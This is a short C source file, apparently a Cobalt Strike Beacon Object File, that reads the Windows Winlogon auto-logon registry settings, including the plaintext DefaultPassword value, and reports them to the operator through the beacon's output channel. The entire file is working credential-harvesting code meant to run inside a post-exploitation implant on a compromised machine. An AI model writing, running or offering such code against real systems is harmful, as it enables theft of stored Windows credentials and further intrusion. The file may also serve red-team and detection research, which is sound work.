/*
 * autologon - read Winlogon auto-logon configuration from the registry.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static void read_value(HKEY root, const char *key, const char *value, const char *label)
{
    HKEY h;
    char buf[512];
    DWORD size = sizeof(buf), type = 0;
    if (ADVAPI32$RegOpenKeyExA(root, key, 0, KEY_READ, &h) == ERROR_SUCCESS) {
        if (ADVAPI32$RegQueryValueExA(h, value, NULL, &type, (LPBYTE)buf, &size) == ERROR_SUCCESS) {
            if (type == REG_SZ || type == REG_EXPAND_SZ) {
                buf[sizeof(buf) - 1] = 0;
                BeaconPrintf(CALLBACK_OUTPUT, "  %-18s %s\n", label, buf);
            } else if (type == REG_DWORD && size >= 4) {
                BeaconPrintf(CALLBACK_OUTPUT, "  %-18s %lu\n", label, (unsigned long)*(DWORD *)buf);
            }
        }
        ADVAPI32$RegCloseKey(h);
    }
}

void go(char *args, int alen)
{
    const char *key = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
    (void)args; (void)alen;

    BeaconPrintf(CALLBACK_OUTPUT, "Winlogon autologon configuration\n");
    read_value(HKEY_LOCAL_MACHINE, key, "AutoAdminLogon", "AutoAdminLogon");
    read_value(HKEY_LOCAL_MACHINE, key, "DefaultUserName", "DefaultUserName");
    read_value(HKEY_LOCAL_MACHINE, key, "DefaultPassword", "DefaultPassword");
    read_value(HKEY_LOCAL_MACHINE, key, "DefaultDomainName", "DefaultDomainName");
    read_value(HKEY_LOCAL_MACHINE, key, "AutoLogonCount", "AutoLogonCount");
}
